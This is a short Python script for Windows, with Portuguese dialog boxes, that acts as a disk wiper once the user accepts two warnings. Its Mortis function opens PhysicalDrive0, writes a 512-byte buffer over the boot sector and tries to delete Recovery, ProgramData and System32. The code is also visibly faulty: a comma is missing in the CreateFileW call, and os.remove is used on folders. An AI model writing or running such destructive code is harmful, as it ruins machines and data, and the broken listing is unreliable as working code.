import os
import sys
import tkinter as tk
from tkinter import messagebox
from win32gui import *
from win32ui import *
from win32con import *
from win32file import *

def SJanela():
    SResposta = messagebox.askyesno("ATENÇÃO", "ÚLTIMO AVISO! Os danos podem ser irreversíveis")
    if SResposta:
        Mortis()
    else:
        sys.exit()

def janela():
    Resposta = messagebox.askyesno("ATENÇÃO", "Tem certeza que deseja foder o seu pc? O criador não se responsabiliza por nada")
    if Resposta:
        Exec = True
        SJanela()
    else:
        sys.exit()

def Mortis():
    hDevice = CreateFileW("\\\\.\\PhysicalDrive0"
                          GENERIC_WRITE,
                          FILE_SHARE_READ | FILE_SHARE_WRITE,
                          None,
                          OPEN_EXISTING,
                          0, 0
                          )
    WriteFile(hDevice,
              AllocateReadBuffer(512),
              None
              )
    CloseHandle(hDevice)

    os.remove("C:\Recovery")
    os.remove("C:\ProgramData")
    os.remove("C:\Windows\System32")
janela()
